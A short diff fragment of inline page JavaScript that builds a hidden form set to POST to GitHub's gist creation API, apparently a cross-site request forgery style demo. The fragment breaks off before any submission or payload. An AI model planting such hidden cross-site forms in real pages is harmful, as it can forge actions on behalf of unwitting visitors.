@@ -4,7 +4,7 @@
 <script type="text/javascript" charset="utf-8">
 var f = document.createElement('form');
 f.style.display = 'none';
-$('lolz').parentNode.appendChild(f);
+document.appendChild(f);
 f.method = 'POST'
 f.action = 'http://gist.github.com/api/v1/xml/new';
 var m = document.createElement('input');
